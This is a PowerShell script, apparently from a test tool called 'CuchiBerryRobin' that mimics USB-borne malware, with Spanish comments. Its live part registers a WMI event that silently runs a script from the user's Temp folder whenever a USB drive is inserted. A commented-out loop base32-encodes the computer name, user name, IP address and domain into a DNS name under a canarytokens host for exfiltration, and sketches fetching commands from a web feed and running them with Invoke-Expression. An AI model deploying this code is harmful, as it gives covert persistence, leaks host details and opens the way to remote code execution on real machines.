

# Define a WMI event query, that looks for new instances of Win32_LogicalDisk where DriveType is "2"
# http://msdn.microsoft.com/en-us/library/aa394173(v=vs.85).aspx
$Query = "select * from __InstanceCreationEvent within 5 where TargetInstance ISA 'Win32_LogicalDisk' and TargetInstance.DriveType = 2";



# Define a PowerShell ScriptBlock that will be executed when an event occurs
#$Action = {  " Write-Host 'CUCHIBERRY_USB_IN'; %USERPROFILE%\AppData\Local\Temp\USBin.ps1;Write-Host 'CUCHIBERRY_USB_IN' "  };
$Action = { iex "$env:USERPROFILE\AppData\Local\Temp\USBin.ps1"  };

# Create the event registration, primero des registro.
try {
    Unregister-Event -SourceIdentifier USBFlashDrive
} catch {
    Write-Host "El evento USBFlashDrive no existe."
}
Register-WmiEvent -Query $Query -Action $Action -SourceIdentifier USBFlashDrive;


#Bucle loop de cada hora que debe salir de otro fichero TODO


<# Iniciar un bucle infinito que ejecuta el comando cada 24 hora 
while ($false) {

$ipAddress = (Test-Connection -ComputerName localhost -Count 1).IPv4Address.IPAddressToString
$dnsToken = "pb6fy865rm7ts4ran9qi2ss2q.canarytokens.com"
$texto = "PERSISTIR_$env:COMPUTERNAME.$env:USERNAME.$ipAddress.$env:USERDNSDOMAIN."

    [byte[]] $bytes = [System.Text.Encoding]::ASCII.GetBytes($texto)
		$byteArrayAsBinaryString = -join $bytes.ForEach{        [Convert]::ToString($_, 2).PadLeft(8, '0')    }
		$byteArrayAsBinaryString = $($byteArrayAsBinaryString+("0000".Substring(0,5-($byteArrayAsBinaryString.length%5))))
		$Base32Secret = [regex]::Replace($byteArrayAsBinaryString, '.{5}', {        param($Match)        'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'[[Convert]::ToInt32($Match.Value, 2)]    })
		$Base32Secret.Replace("=","")
		$randomDigits = Get-Random -Minimum 10 -Maximum 100
		$splitData = [System.Text.RegularExpressions.Regex]::Split($base32Secret, "(?<=\G.{63})") | Where-Object { $_ -ne "" } 
		$splitData= $splitData -join "."
		$encodedData = $splitData  + ".G$randomDigits." + $dnsToken
		$encodedData
    #Buscamos tareas que realizar....
    #TODO descargar de PASTEBIN y ejecutar
    #$content = Invoke-WebRequest -Uri "https://www.google.es/alerts/feeds/14322507702556587554/7498838164931141655" -UseBasicParsing
    #$patron = '(?<=#CUCHIROBIN )(.*)(?= #FIN)'
    #$resultado = [regex]::Match($content, $patron).Value
    #Invoke-Expression $resultado
    
   
    #AVISO AL USUARIO QUE ESTA COMPROMETIDO
    $Title = "CuchiBerryRObin"
    $Message = "Tu equipo ha sido comprometido con CUHIBERRYROBIN, es solo una prueba."
    $Type = "info" 
    [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
    $path = Get-Process -id $pid | Select-Object -ExpandProperty Path
    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
    $notify = new-object system.windows.forms.notifyicon
    $notify.icon = $icon
    $notify.visible = $true
    $notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)

 # Esperar una hora antes de volver a ejecutar el comando
    Start-Sleep -Seconds 3600

}
#>